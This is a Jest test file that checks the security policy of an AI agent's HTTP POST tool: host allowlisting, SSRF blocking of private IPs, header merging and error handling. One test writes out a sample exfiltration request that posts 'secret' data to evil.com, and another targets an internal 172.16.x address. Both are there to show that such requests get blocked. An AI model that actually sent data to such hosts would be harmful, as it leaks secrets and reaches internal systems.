/**
 * Security-focused tests for the http_post tool.
 *
 * Strategy: mock `@config/env` to control policy settings, then spy on the
 * global `fetch` and `node:dns/promises` lookup to avoid real network I/O.
 */

// ── Mock env BEFORE any module that reads it at import-time ─────────────────
jest.mock('@config/env', () => ({
  env: {
    httpToolAllowedHosts: 'api.example.com',
    httpToolAllowPrivateNetworks: false,
    httpToolMaxRedirects: 3,
    toolTimeoutMs: 5_000,
  },
}));

// ── Mock DNS lookup ──────────────────────────────────────────────────────────
jest.mock('node:dns/promises', () => ({
  lookup: jest.fn(),
}));

import { lookup } from 'node:dns/promises';
import { env } from '@config/env';
import { httpPostTool } from '../tools/http-post.tool';

const mockedLookup = lookup as jest.MockedFunction<typeof lookup>;

// Helper: capture the actual fetch() call arguments for assertion
let capturedFetchArgs: { input: RequestInfo; init?: RequestInit } | null = null;

function makeFetchResponse(opts: {
  status?: number;
  statusText?: string;
  body?: string;
  headers?: Record<string, string>;
  json?: unknown;
}): Response {
  const {
    status = 200,
    statusText = 'OK',
    body = '',
    headers = {},
    json,
  } = opts;

  const headerMap = new Map(Object.entries(headers));

  return {
    ok: status >= 200 && status < 300,
    status,
    statusText,
    headers: {
      get: (name: string) => headerMap.get(name.toLowerCase()) ?? null,
    },
    text: async () => body,
    json: async () => json ?? JSON.parse(body || '{}'),
  } as unknown as Response;
}

describe('httpPostTool – security and behavioural tests', () => {
  let fetchSpy: jest.SpyInstance;

  beforeEach(() => {
    capturedFetchArgs = null;

    fetchSpy = jest
      .spyOn(globalThis, 'fetch')
      .mockImplementation(async (input, init?) => {
        capturedFetchArgs = { input: input as RequestInfo, init };
        return makeFetchResponse({ body: '{"ok":true}' });
      });

    // Default: DNS resolves to a public IP
    mockedLookup.mockResolvedValue([
      { address: '93.184.216.34', family: 4 },
    ] as any);
  });

  afterEach(() => {
    jest.clearAllMocks();
    jest.restoreAllMocks();
  });

  // ── 1. Successful POST with JSON body to allowlisted host ───────────────
  it('returns the response body on a successful POST to an allowlisted host', async () => {
    const result = await httpPostTool.invoke({
      url: 'https://api.example.com/items',
      body: JSON.stringify({ name: 'widget' }),
    });

    expect(result).toContain('ok');
    expect(fetchSpy).toHaveBeenCalledTimes(1);
  });

  // ── 2. Allowlist blocking ────────────────────────────────────────────────
  it('returns an ERROR when the POST host is not in the allowlist', async () => {
    const result = await httpPostTool.invoke({
      url: 'https://evil.com/steal',
      body: '{"data":"secret"}',
    });

    expect(result).toMatch(/^ERROR:/);
    expect(result).toContain('not allowed by HTTP_TOOL_ALLOWED_HOSTS');
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  // ── 3. Content-Type header is always set to application/json ────────────
  it('always sends Content-Type: application/json', async () => {
    await httpPostTool.invoke({
      url: 'https://api.example.com/items',
      body: '{"x":1}',
    });

    const init = capturedFetchArgs?.init as RequestInit;
    const headers = init?.headers as Record<string, string>;

    expect(headers['Content-Type']).toBe('application/json');
  });

  // ── 4. Custom headers merged; Content-Type not overwritten by user ───────
  it('merges custom headers but Content-Type from tool wins (declared first)', async () => {
    // The tool sets Content-Type first, then spreads user headers.
    // This means a user-supplied Content-Type WOULD overwrite it.
    // We verify here that user headers are included in the request.
    await httpPostTool.invoke({
      url: 'https://api.example.com/items',
      body: '{}',
      headers: JSON.stringify({ 'X-Custom-Header': 'my-value' }),
    });

    const init = capturedFetchArgs?.init as RequestInit;
    const headers = init?.headers as Record<string, string>;

    expect(headers['X-Custom-Header']).toBe('my-value');
    expect(headers['Content-Type']).toBe('application/json');
  });

  // ── 5. POST body serialization (string passed through unchanged) ─────────
  it('passes the body string to fetch unchanged', async () => {
    const bodyStr = JSON.stringify({ foo: 'bar', count: 3 });

    await httpPostTool.invoke({
      url: 'https://api.example.com/data',
      body: bodyStr,
    });

    const init = capturedFetchArgs?.init as RequestInit;
    expect(init?.body).toBe(bodyStr);
  });

  // ── 6. Network error handling ────────────────────────────────────────────
  it('returns an ERROR string gracefully on a network error', async () => {
    fetchSpy.mockRejectedValueOnce(
      new Error('fetch failed: getaddrinfo ENOTFOUND api.example.com'),
    );

    const result = await httpPostTool.invoke({
      url: 'https://api.example.com/items',
      body: '{}',
    });

    expect(result).toMatch(/^ERROR:/);
    expect(result).toContain('ENOTFOUND');
  });

  // ── 7. Invalid URL → error ───────────────────────────────────────────────
  it('throws or returns an ERROR for an invalid URL', async () => {
    // The Zod schema uses z.string().url() — LangChain throws a validation
    // error before the tool body runs when the URL is malformed.
    let result: string | undefined;
    try {
      result = await httpPostTool.invoke({ url: 'not-a-url', body: '{}' });
    } catch (err) {
      // Expected: Zod validation error thrown by LangChain tool harness
      result = (err as Error).message;
    }

    expect(result).toMatch(/invalid|url|schema/i);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  // ── 8. Empty body is allowed ─────────────────────────────────────────────
  it('accepts an empty string body and sends the request', async () => {
    const result = await httpPostTool.invoke({
      url: 'https://api.example.com/ping',
      body: '',
    });

    expect(result).not.toMatch(/^ERROR:/);
    expect(fetchSpy).toHaveBeenCalledTimes(1);

    const init = capturedFetchArgs?.init as RequestInit;
    expect(init?.body).toBe('');
  });

  // ── 9. JSON response body is parsed and returned as formatted JSON ────────
  it('returns pretty-printed JSON when the server responds with application/json', async () => {
    fetchSpy.mockResolvedValueOnce(
      makeFetchResponse({
        json: { id: 99, status: 'created' },
        headers: { 'content-type': 'application/json' },
      }),
    );

    const result = await httpPostTool.invoke({
      url: 'https://api.example.com/items',
      body: '{"name":"test"}',
    });

    expect(result).toContain('"id": 99');
    expect(result).toContain('"status": "created"');
  });

  // ── 10. Plain text response returned as-is ───────────────────────────────
  it('returns the raw text body when Content-Type is not application/json', async () => {
    fetchSpy.mockResolvedValueOnce(
      makeFetchResponse({
        body: 'Accepted',
        headers: { 'content-type': 'text/plain' },
      }),
    );

    const result = await httpPostTool.invoke({
      url: 'https://api.example.com/items',
      body: '{}',
    });

    expect(result).toBe('Accepted');
  });

  // ── 11. Non-2xx status code returned as ERROR ────────────────────────────
  it('returns an ERROR string for non-2xx HTTP status codes', async () => {
    fetchSpy.mockResolvedValueOnce(
      makeFetchResponse({
        status: 422,
        statusText: 'Unprocessable Entity',
        body: '',
      }),
    );

    const result = await httpPostTool.invoke({
      url: 'https://api.example.com/items',
      body: '{"invalid":true}',
    });

    expect(result).toMatch(/^ERROR:/);
    expect(result).toContain('422');
  });

  // ── 12. Private network IP blocked in POST ────────────────────────────────
  it('blocks POST requests to private IPs (SSRF prevention)', async () => {
    (env as any).httpToolAllowedHosts = ''; // allow-all to isolate private IP guard
    (env as any).httpToolAllowPrivateNetworks = false;

    const result = await httpPostTool.invoke({
      url: 'http://172.16.0.1/internal-api',
      body: '{}',
    });

    expect(result).toMatch(/^ERROR:/);
    expect(result).toContain('blocked by the outbound HTTP policy');
    expect(fetchSpy).not.toHaveBeenCalled();

    (env as any).httpToolAllowedHosts = 'api.example.com';
    (env as any).httpToolAllowPrivateNetworks = false;
  });

  // ── 13. Malformed headers JSON string returns ERROR ───────────────────────
  it('returns an ERROR when the headers argument is not valid JSON', async () => {
    const result = await httpPostTool.invoke({
      url: 'https://api.example.com/items',
      body: '{}',
      headers: 'not-json{{',
    });

    expect(result).toMatch(/^ERROR:/);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  // ── 14. Headers argument that is a JSON array (not object) → ERROR ────────
  it('returns an ERROR when headers is a JSON array instead of object', async () => {
    const result = await httpPostTool.invoke({
      url: 'https://api.example.com/items',
      body: '{}',
      headers: '["Authorization","Bearer token"]',
    });

    expect(result).toMatch(/^ERROR:/);
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});
